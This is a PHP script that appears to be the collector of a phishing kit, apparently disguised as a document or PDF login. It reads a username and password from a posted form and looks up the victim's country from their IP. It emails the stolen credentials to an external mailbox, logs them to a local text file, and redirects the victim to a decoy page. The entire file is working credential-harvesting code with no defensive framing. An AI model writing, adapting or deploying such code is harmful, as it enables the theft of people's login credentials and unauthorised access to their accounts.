<?php

extract($_POST);

$ip = getenv("REMOTE_ADDR");
//Get IP Country City
$url = "http://api.ipinfodb.com/v3/ip-country/?key=d5fffa06f621e0c28602b13de0c551db8aa491f01e694648988453bc9bcf72e1&ip=$ip";
$ipCountryCityInfo = file_get_contents($url);
//
$Email = $_POST['feedback'];
$Passwd = $_POST['feedbacknow'];

$message .= "Username: ".$Email."\n";
$message .= "PassWord: ".$Passwd."\n";
$message .= "Country: ".$ipCountryCityInfo."\n";

$from .= "MIME-Version: 1.0\r\n";
$subj .= "$ip ATT PDF";

if (empty($Email) || empty($Passwd)) {
header( "Location: https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.scribd.com%2Fdocument%2F410830622%2Fremita-pdf&psig=AOvVaw1BuwW423IZIrm0TjGW411p&ust=1611655087068000&source=images&cd=vfe&ved=0CAIQjRxqFwoTCID5ppvptu4CFQAAAAAdAAAAABAD" );
}
else {
mail("davebrow50@yandex.com", $subj, $message, $from);
header("Location: https://i.stack.imgur.com/V7ghy.jpg");
}
$fp = fopen("an.txt","a");
fputs($fp,$message);
fclose($fp);
?>